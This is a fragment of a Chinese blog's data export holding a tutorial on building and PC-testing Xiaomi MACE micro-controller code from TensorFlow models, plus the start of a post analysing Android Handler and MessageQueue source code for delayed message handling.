GPU功耗选项。</li>\n</ul>\n</li>\n<li>系统响应<ul>\n<li>支持自动拆解长时间的OpenCL计算任务，来保证UI渲染任务能够做到较好的抢占调度，从而保证系统UI的相应和用户体验。</li>\n</ul>\n</li>\n<li>内存占用<ul>\n<li>通过运用内存依赖分析技术，以及内存复用，减少内存的占用。另外，保持尽量少的外部依赖，保证代码尺寸精简。</li>\n</ul>\n</li>\n<li>模型加密与保护<ul>\n<li>模型保护是重要设计目标之一。支持将模型转换成C++代码，以及关键常量字符混淆，增加逆向的难度。</li>\n</ul>\n</li>\n<li>硬件支持范围<ul>\n<li>支持高通，联发科，以及松果等系列芯片的CPU，GPU与DSP(目前仅支持Hexagon)计算加速。CPU模式支持Android, iOS, Linux等系统。</li>\n</ul>\n</li>\n<li>模型格式支持<ul>\n<li>支持<a href=\"https://github.com/tensorflow/tensorflow\">TensorFlow</a>，<a href=\"https://github.com/BVLC/caffe\">Caffe</a>和<a href=\"https://github.com/onnx/onnx\">ONNX</a>等模型格式。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Micro-Controllers\"><a href=\"#Micro-Controllers\" class=\"headerlink\" title=\"Micro Controllers\"></a>Micro Controllers</h2><p>上面的简介摘自<a href=\"https://github.com/XiaoMi/mace/blob/master/README_zh.md\">官方GitHub介绍</a>，可以让大家基本了解什么是mace引擎，它是一个移动端的AI计算框架。随着谷歌Tensorflow Lite的推广，越来越多的移动应用都将部分AI计算能力迁移至端侧，这些机器学习的算法都是运行在应用层的。但大多数系统层面的计算，例如省电优化（根据应用使用习惯）、睡眠监测、运动行为识别、语音唤醒手机等，为了保证低功耗，必须放在底层，这样计算过程中就无需唤醒上层的一系列进程，只等有结果时才唤醒并上报数据。</p>\n<p>有多底层呢？通常来说就是BP侧，在HAL层以下，逻辑基本运行在类似DSP这样的处理器上，部分工作需要开发人员和硬件驱动打交道。mace框架支持将TF模型文件转换成C++代码并打包成micro组件，方便我们集成。</p>\n<h2 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h2><p>官方文档（<a href=\"https://mace.readthedocs.io/en/latest/micro-controllers/basic_usage.html\">https://mace.readthedocs.io/en/latest/micro-controllers/basic_usage.html</a>）写得比较详尽，但一些细节和注意点还是只有实践过程中才会发现。我的系统是Ubuntu 20.04，部分依赖安装起来稍微麻烦一点（mace官方要求的依赖很多版本很旧）。</p>\n<p>先配置基础环境，要装的东西挺多的，按官方给的版本号安装即可（<a href=\"https://mace.readthedocs.io/en/latest/installation/env_requirement.html\">https://mace.readthedocs.io/en/latest/installation/env_requirement.html</a>）。下面只提一些注意点。</p>\n<p>1、安装Python 2.7：Ubuntu 18.04就不自带Python 2.x了，默认是3.x，所以一定要自己手动安装Python 2.7，注意配置python和pip命令默认对应的版本为2.x。虽然mace官方文档写的3.6也可以编，但是我试过，各种失败。</p>\n<p>2、安装Bazel 0.13.x（实测0.13.0和0.13.1都行）：由于Ubuntu直接用apt安装bazel的话版本会非常高，最后会导致编译失败。Ubuntu的话直接到bazel官方GitHub下载对应版本的deb文件来安装即可：<a href=\"https://github.com/bazelbuild/bazel/releases?after=0.16.1\">https://github.com/bazelbuild/bazel/releases?after=0.16.1</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg -i bazel_0.13.1-linux-x86_64.deb</span><br></pre></td></tr></table></figure>\n\n<p>3、由于我只在手机BP侧运行micro代码，且基于Tensorflow的模型文件转换，所以官方文档中提到的Android NDK、ADB和Docker这里都不需要安装，除此之外都最好安装完。</p>\n<p>配置好各种环境后，就可以根据basic_usage中的步骤拉取mace代码，并执行转换命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 直接执行，不需要改</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XiaoMi/mace.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> mace/</span><br><span class=\"line\">git fetch --all --tags --prune</span><br><span class=\"line\">tag_name=`git describe --abbrev=0 --tags`</span><br><span class=\"line\">git checkout tags/<span class=\"variable\">$&#123;tag_name&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># 转换脚本（保证是Python 2.x版本）</span></span><br><span class=\"line\">python tools/python/convert.py --config=xxx.yml --enable_micro</span><br></pre></td></tr></table></figure>\n\n<p>这里的xxx.yml是模型转换的配置文件，可以参考官方示例：<a href=\"https://github.com/XiaoMi/mace-models\">https://github.com/XiaoMi/mace-models</a></p>\n<p>转换成功后，在mace&#x2F;build&#x2F;xxx&#x2F;model目录下面会有转换成功的产物，解压xxx.tar.gz压缩包即可得到micro代码。</p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>如果每次都将micro代码集成到底层打包再进行模型测试，那太麻烦了，效率低下。因此，我们可以将其直接运行在PC上来进行输入数据mock，这个是官方文档没有提到的，需要我们自己修改CMake配置文件并添加测试代码。</p>\n<p>我用CLion直接打开micro文件夹，导入后会自动加载CMakeLists文件，然而肯定是编不过的，需要对各目录下的CMakeLists稍作修改，可以直接根据错误提示来。由于不同模型转换得到的C++代码可能会有一些差异，但大致应该是差不多的，比如我这个模型转换后就只需要修改ops&#x2F;CMakeLists.txt，注释掉其中不存在的源文件（因为你的模型可能不需要这些代码，所以刚才的convert脚本给你删掉了，但CMakeLists里又没做调整，应该是脚本没考虑周全吧）。示例：</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span>(MICRO_OPS_SRCS</span><br><span class=\"line\"><span class=\"comment\">#  shape.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  reduce.cc</span></span><br><span class=\"line\">  reshape.cc</span><br><span class=\"line\">  matmul.cc</span><br><span class=\"line\"><span class=\"comment\">#  nhwc/depthwise_conv_2d_ref.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/conv_2d_c4_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/depthwise_conv_2d_kb3_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/pooling_ref.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/conv_2d_c3_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/conv_2d_ref.cc</span></span><br><span class=\"line\">  nhwc/depthwise_conv_2d_kb4_s4.cc</span><br><span class=\"line\">  nhwc/depthwise_conv_2d_kb1_s4.cc</span><br><span class=\"line\">  nhwc/base/depthwise_conv_2d_base.cc</span><br><span class=\"line\">  nhwc/base/conv_2d_base.cc</span><br><span class=\"line\">  nhwc/base/filter_op_base.cc</span><br><span class=\"line\">  nhwc/base/pooling_base.cc</span><br><span class=\"line\"><span class=\"comment\">#  nhwc/depthwise_conv_2d_kb2_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/conv_2d_c2_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/batch_norm.cc</span></span><br><span class=\"line\">  nhwc/pooling_s4.cc</span><br><span class=\"line\">  bias_add.cc</span><br><span class=\"line\">  softmax.cc</span><br><span class=\"line\"><span class=\"comment\">#  eltwise.cc</span></span><br><span class=\"line\">  utils/gemm.cc</span><br><span class=\"line\">  utils/crumb_utils.cc</span><br><span class=\"line\">  utils/gemv.cc</span><br><span class=\"line\">  utils/activation.cc</span><br><span class=\"line\"><span class=\"comment\">#  expand_dims.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  squeeze.cc</span></span><br><span class=\"line\">  activation.cc</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">add_library</span>(micro_ops</span><br><span class=\"line\">  <span class=\"variable\">$&#123;MICRO_OPS_SRCS&#125;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">target_link_libraries</span>(micro_ops</span><br><span class=\"line\">  micro_base</span><br><span class=\"line\">  micro_framework</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">add_library</span>(micro_ops_for_test</span><br><span class=\"line\">  <span class=\"variable\">$&#123;MICRO_OPS_SRCS&#125;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">target_link_libraries</span>(micro_ops_for_test</span><br><span class=\"line\">  micro_base</span><br><span class=\"line\">  micro_framework_for_optest</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">target_compile_options</span>(micro_ops_for_test PUBLIC -fPIC)</span><br></pre></td></tr></table></figure>\n\n<p>编译错误提示找不到的，直接注释掉即可。接下来就可以自己编写测试代码来验证模型输出了，具体可以参考官方文档basic_usage最后一节。比如我这里在micro目录下添加了一个主入口测试文件main_test.cc和一个依赖文件my_test_utils.cc（包括.h头文件），只需要修改一下同目录下的CMakeLists（这个文件也是micro的顶层编译配置）即可：</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 追加配置即可</span></span><br><span class=\"line\"><span class=\"comment\"># main_test_srcs、micro_test_run_lib、micro_test_run都是自定义的名字</span></span><br><span class=\"line\"><span class=\"keyword\">file</span>(GLOB main_test_srcs my_test_utils.cc)</span><br><span class=\"line\"><span class=\"keyword\">add_library</span>(micro_test_run_lib</span><br><span class=\"line\">  <span class=\"variable\">$&#123;main_test_srcs&#125;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">add_executable</span>(micro_test_run main_test.cc)</span><br><span class=\"line\"><span class=\"comment\"># 这里必须链接micro_engine_c，这样才能调用mace的API</span></span><br><span class=\"line\"><span class=\"keyword\">target_link_libraries</span>(micro_test_run</span><br><span class=\"line\">  micro_test_run_lib</span><br><span class=\"line\">  micro_engine_c</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<p><img src=\"https://github.com/XiaoMi/mace/raw/master/docs/mace-logo.png\"></p>\n<h2 id=\"官方简介\"><a href=\"#官方简介\" class=\"headerlink\" title=\"官方简介\"></a>官方简介</h2><p><strong>Mobile AI Compute Engine (MACE)</strong> 是一个专为移动端异构计算平台(支持Android, iOS, Linux, Windows)优化的神经网络计算框架。<br>主要从以下的角度做了专门的优化：</p>\n<ul>\n<li>性能<ul>\n<li>代码经过NEON指令，OpenCL以及Hexagon HVX专门优化，并且采用<a href=\"https://arxiv.org/abs/1509.09308\">Winograd算法</a>来进行卷积操作的加速。<br>此外，还对启动速度进行了专门的优化。</li>\n</ul>\n</li>\n<li>功耗<ul>\n<li>支持芯片的功耗管理，例如ARM的big.LITTLE调度，以及高通Adreno GPU功耗选项。</li>\n</ul>\n</li>\n<li>系统响应<ul>\n<li>支持自动拆解长时间的OpenCL计算任务，来保证UI渲染任务能够做到较好的抢占调度，从而保证系统UI的相应和用户体验。</li>\n</ul>\n</li>\n<li>内存占用<ul>\n<li>通过运用内存依赖分析技术，以及内存复用，减少内存的占用。另外，保持尽量少的外部依赖，保证代码尺寸精简。</li>\n</ul>\n</li>\n<li>模型加密与保护<ul>\n<li>模型保护是重要设计目标之一。支持将模型转换成C++代码，以及关键常量字符混淆，增加逆向的难度。</li>\n</ul>\n</li>\n<li>硬件支持范围<ul>\n<li>支持高通，联发科，以及松果等系列芯片的CPU，GPU与DSP(目前仅支持Hexagon)计算加速。CPU模式支持Android, iOS, Linux等系统。</li>\n</ul>\n</li>\n<li>模型格式支持<ul>\n<li>支持<a href=\"https://github.com/tensorflow/tensorflow\">TensorFlow</a>，<a href=\"https://github.com/BVLC/caffe\">Caffe</a>和<a href=\"https://github.com/onnx/onnx\">ONNX</a>等模型格式。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Micro-Controllers\"><a href=\"#Micro-Controllers\" class=\"headerlink\" title=\"Micro Controllers\"></a>Micro Controllers</h2><p>上面的简介摘自<a href=\"https://github.com/XiaoMi/mace/blob/master/README_zh.md\">官方GitHub介绍</a>，可以让大家基本了解什么是mace引擎，它是一个移动端的AI计算框架。随着谷歌Tensorflow Lite的推广，越来越多的移动应用都将部分AI计算能力迁移至端侧，这些机器学习的算法都是运行在应用层的。但大多数系统层面的计算，例如省电优化（根据应用使用习惯）、睡眠监测、运动行为识别、语音唤醒手机等，为了保证低功耗，必须放在底层，这样计算过程中就无需唤醒上层的一系列进程，只等有结果时才唤醒并上报数据。</p>\n<p>有多底层呢？通常来说就是BP侧，在HAL层以下，逻辑基本运行在类似DSP这样的处理器上，部分工作需要开发人员和硬件驱动打交道。mace框架支持将TF模型文件转换成C++代码并打包成micro组件，方便我们集成。</p>\n<h2 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h2><p>官方文档（<a href=\"https://mace.readthedocs.io/en/latest/micro-controllers/basic_usage.html\">https://mace.readthedocs.io/en/latest/micro-controllers/basic_usage.html</a>）写得比较详尽，但一些细节和注意点还是只有实践过程中才会发现。我的系统是Ubuntu 20.04，部分依赖安装起来稍微麻烦一点（mace官方要求的依赖很多版本很旧）。</p>\n<p>先配置基础环境，要装的东西挺多的，按官方给的版本号安装即可（<a href=\"https://mace.readthedocs.io/en/latest/installation/env_requirement.html\">https://mace.readthedocs.io/en/latest/installation/env_requirement.html</a>）。下面只提一些注意点。</p>\n<p>1、安装Python 2.7：Ubuntu 18.04就不自带Python 2.x了，默认是3.x，所以一定要自己手动安装Python 2.7，注意配置python和pip命令默认对应的版本为2.x。虽然mace官方文档写的3.6也可以编，但是我试过，各种失败。</p>\n<p>2、安装Bazel 0.13.x（实测0.13.0和0.13.1都行）：由于Ubuntu直接用apt安装bazel的话版本会非常高，最后会导致编译失败。Ubuntu的话直接到bazel官方GitHub下载对应版本的deb文件来安装即可：<a href=\"https://github.com/bazelbuild/bazel/releases?after=0.16.1\">https://github.com/bazelbuild/bazel/releases?after=0.16.1</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dpkg -i bazel_0.13.1-linux-x86_64.deb</span><br></pre></td></tr></table></figure>\n\n<p>3、由于我只在手机BP侧运行micro代码，且基于Tensorflow的模型文件转换，所以官方文档中提到的Android NDK、ADB和Docker这里都不需要安装，除此之外都最好安装完。</p>\n<p>配置好各种环境后，就可以根据basic_usage中的步骤拉取mace代码，并执行转换命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 直接执行，不需要改</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XiaoMi/mace.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> mace/</span><br><span class=\"line\">git fetch --all --tags --prune</span><br><span class=\"line\">tag_name=`git describe --abbrev=0 --tags`</span><br><span class=\"line\">git checkout tags/<span class=\"variable\">$&#123;tag_name&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># 转换脚本（保证是Python 2.x版本）</span></span><br><span class=\"line\">python tools/python/convert.py --config=xxx.yml --enable_micro</span><br></pre></td></tr></table></figure>\n\n<p>这里的xxx.yml是模型转换的配置文件，可以参考官方示例：<a href=\"https://github.com/XiaoMi/mace-models\">https://github.com/XiaoMi/mace-models</a></p>\n<p>转换成功后，在mace&#x2F;build&#x2F;xxx&#x2F;model目录下面会有转换成功的产物，解压xxx.tar.gz压缩包即可得到micro代码。</p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>如果每次都将micro代码集成到底层打包再进行模型测试，那太麻烦了，效率低下。因此，我们可以将其直接运行在PC上来进行输入数据mock，这个是官方文档没有提到的，需要我们自己修改CMake配置文件并添加测试代码。</p>\n<p>我用CLion直接打开micro文件夹，导入后会自动加载CMakeLists文件，然而肯定是编不过的，需要对各目录下的CMakeLists稍作修改，可以直接根据错误提示来。由于不同模型转换得到的C++代码可能会有一些差异，但大致应该是差不多的，比如我这个模型转换后就只需要修改ops&#x2F;CMakeLists.txt，注释掉其中不存在的源文件（因为你的模型可能不需要这些代码，所以刚才的convert脚本给你删掉了，但CMakeLists里又没做调整，应该是脚本没考虑周全吧）。示例：</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">set</span>(MICRO_OPS_SRCS</span><br><span class=\"line\"><span class=\"comment\">#  shape.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  reduce.cc</span></span><br><span class=\"line\">  reshape.cc</span><br><span class=\"line\">  matmul.cc</span><br><span class=\"line\"><span class=\"comment\">#  nhwc/depthwise_conv_2d_ref.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/conv_2d_c4_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/depthwise_conv_2d_kb3_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/pooling_ref.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/conv_2d_c3_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/conv_2d_ref.cc</span></span><br><span class=\"line\">  nhwc/depthwise_conv_2d_kb4_s4.cc</span><br><span class=\"line\">  nhwc/depthwise_conv_2d_kb1_s4.cc</span><br><span class=\"line\">  nhwc/base/depthwise_conv_2d_base.cc</span><br><span class=\"line\">  nhwc/base/conv_2d_base.cc</span><br><span class=\"line\">  nhwc/base/filter_op_base.cc</span><br><span class=\"line\">  nhwc/base/pooling_base.cc</span><br><span class=\"line\"><span class=\"comment\">#  nhwc/depthwise_conv_2d_kb2_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/conv_2d_c2_s4.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  nhwc/batch_norm.cc</span></span><br><span class=\"line\">  nhwc/pooling_s4.cc</span><br><span class=\"line\">  bias_add.cc</span><br><span class=\"line\">  softmax.cc</span><br><span class=\"line\"><span class=\"comment\">#  eltwise.cc</span></span><br><span class=\"line\">  utils/gemm.cc</span><br><span class=\"line\">  utils/crumb_utils.cc</span><br><span class=\"line\">  utils/gemv.cc</span><br><span class=\"line\">  utils/activation.cc</span><br><span class=\"line\"><span class=\"comment\">#  expand_dims.cc</span></span><br><span class=\"line\"><span class=\"comment\">#  squeeze.cc</span></span><br><span class=\"line\">  activation.cc</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">add_library</span>(micro_ops</span><br><span class=\"line\">  <span class=\"variable\">$&#123;MICRO_OPS_SRCS&#125;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">target_link_libraries</span>(micro_ops</span><br><span class=\"line\">  micro_base</span><br><span class=\"line\">  micro_framework</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">add_library</span>(micro_ops_for_test</span><br><span class=\"line\">  <span class=\"variable\">$&#123;MICRO_OPS_SRCS&#125;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">target_link_libraries</span>(micro_ops_for_test</span><br><span class=\"line\">  micro_base</span><br><span class=\"line\">  micro_framework_for_optest</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">target_compile_options</span>(micro_ops_for_test PUBLIC -fPIC)</span><br></pre></td></tr></table></figure>\n\n<p>编译错误提示找不到的，直接注释掉即可。接下来就可以自己编写测试代码来验证模型输出了，具体可以参考官方文档basic_usage最后一节。比如我这里在micro目录下添加了一个主入口测试文件main_test.cc和一个依赖文件my_test_utils.cc（包括.h头文件），只需要修改一下同目录下的CMakeLists（这个文件也是micro的顶层编译配置）即可：</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 追加配置即可</span></span><br><span class=\"line\"><span class=\"comment\"># main_test_srcs、micro_test_run_lib、micro_test_run都是自定义的名字</span></span><br><span class=\"line\"><span class=\"keyword\">file</span>(GLOB main_test_srcs my_test_utils.cc)</span><br><span class=\"line\"><span class=\"keyword\">add_library</span>(micro_test_run_lib</span><br><span class=\"line\">  <span class=\"variable\">$&#123;main_test_srcs&#125;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">add_executable</span>(micro_test_run main_test.cc)</span><br><span class=\"line\"><span class=\"comment\"># 这里必须链接micro_engine_c，这样才能调用mace的API</span></span><br><span class=\"line\"><span class=\"keyword\">target_link_libraries</span>(micro_test_run</span><br><span class=\"line\">  micro_test_run_lib</span><br><span class=\"line\">  micro_engine_c</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"源码茶舍之没有epoll就没有Handler","subtitle":"探索发现。","date":"2020-11-17T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> Handler，英文释义：处理者，处理程序。他就是Android系统中的打工人，背负着传递消息的重任。很多人在第一次尝试去阅读framework源码时，可能也是从Handler消息机制开始的，我们会发现源码的很多地方都用到了Handler。然而，他好像并没有我们想象的那么简单，如果我们要深入探索的话，可以一直追溯到Linux内核。\n\n## 预备\n\n本文分析源码均基于API 29，来源于官方AOSP：[cs.android.com](https://cs.android.com/android/platform/superproject/)\n\n## 问号\n\nHandler的API使用还是比较简单的，我们比较常用的就是通过类似如下方式来发送一个Runnable到Handler所在线程去执行：\n\n```java\nnew Handler().post(() -> { /* do something */ });\nnew Handler().postDelayed(() -> { /* do something after 3s */ }, 3000);\n```\n\n这里为了简单直接用了匿名类，当然你也可以实现自定义的Handler并重写 `handleMessage` 方法来处理消息。`post` 最终其实还是调用到了Handler的  `sendMessageDelayed` 方法，将Runnable封装成一个Message发送到消息队列MessageQueue中，最后再由Looper循环将其取出，再交回Handler来处理。因此我们在子线程调用主线程的Handler来发送消息时，就达到了异步执行任务再将结果告知主线程的目的。\n\n好奇的同学就会有问号了，**这个上面的delay延迟执行是如何实现的（今天的重点）？**是定时器吗？还是周期性轮询？还是事件驱动？带着这些疑问，就不得不深入源码了。\n\n## Java层\n\n废话不多说直接看Handler源码：\n\n```java\npublic final boolean sendMessageDelayed(@NonNull Message msg, long delayMillis) {\n    if (delayMillis < 0) {\n        delayMillis = 0;\n    }\n    return sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);\n}\n\npublic boolean sendMessageAtTime(@NonNull Message msg, long uptimeMillis) {\n    MessageQueue queue = mQueue;\n    ...\n    return enqueueMessage(queue, msg, uptimeMillis);\n}\n```\n\n这里有个细节，最终调用的是 `sendMessageAtTime` 方法，且并没有直接把delay时长传进去，而是通过加当前时间得到一个确切时间作为参数传递的。这样做的原因：后续调用到系统底层时，若再需要这个delay，会用这个确切的uptime减去新的当前时间，保证精准，减少误差（因为从应用层调用到底层还是需要不少时间的）。\n\nHandler的 `enqueueMessage` 方法稍作处理后会调用到MessageQueue的同名方法，在分析之前我们大脑中先保留一个粗浅的概念以便于理解后面的源码，就是**当消息队列为空或者队头的消息delay时间还没到时，相关代码阻塞（但线程释放CPU资源进入休眠状态），新的消息来时才可能唤醒**，后面我们会剖析其原理。说回来，先看MessageQueue的 `enqueueMessage` ：\n\n```java\nboolean enqueueMessage(Message msg, long when) { // when就是上面的uptimeMillis\n    ...\n    synchronized (this) {\n        ...\n        msg.when = when; // 刚才得到的uptimeMillis赋值给msg消息对象了\n        Message p = mMessages; // 为什么mMessages命名是复数，因为是一个链表结构，来存储消息队列\n        boolean needWake; // 是否需要唤醒，为什么要唤醒？后面会讲到\n        if (p == null || when == 0 || when < p.when) {\n            // 插入消息到队头，如果阻塞就唤醒\n            msg.next = p;\n            mMessages = msg;\n            needWake = mBlocked;\n        } else {\n            // 下面这一堆（比如isAsynchronous）可以暂时不管，只用知道是在做新消息插入到链表的操作就可以了\n            needWake = mBlocked && p.target == null && msg.isAsynchronous();\n            Message prev;\n            for (;;) {\n                prev = p;\n                p = p.next;\n                // for循环结合这里的if条件，保证了消息是按when时间排序的\n                if (p == null || when < p.when) {\n                    break;\n                }\n                if (needWake && p.isAsynchronous()) {\n                    needWake = false;\n                }\n            }\n            msg.next = p; // 经过上面的变换，这里的p实际上是prev原本的next节点\n            prev.next = msg; // 再更新prev的next节点，msg正式插入消息队列\n        }\n        if (needWake) {\n            // 【重点】进行native方法调用唤醒，这里的mPtr其实是MessageQueue在native层对象的引用，后面会讲到\n            nativeWake(mPtr);\n        }\n    }\n    return true;\n}\n```\n\n这段代码比较简单，主要就是把新来的消息按delay时间排序入队，并在必要情况下进行唤醒操作。产生的疑问便是：\n\n- 这个唤醒是唤醒了个什么？为什么要进行native方法调用？\n- 传进来的when时间字段赋值给msg了，后续又如何利用的呢？\n\n带着这些问题，我们就要去找Looper了，因为它是整个消息机制流水线的发动机，其动力在 `loop` 方法：\n\n```java\npublic static void loop() {\n    final Looper me = myLooper(); // 一个线程对应一个Looper\n    ...\n    final MessageQueue queue = me.mQueue; // 每个Looper对应一个消息队列\n    ...\n    for (;;) {\n        Message msg = queue.next(); // might block（会阻塞）\n        ...\n    }\n    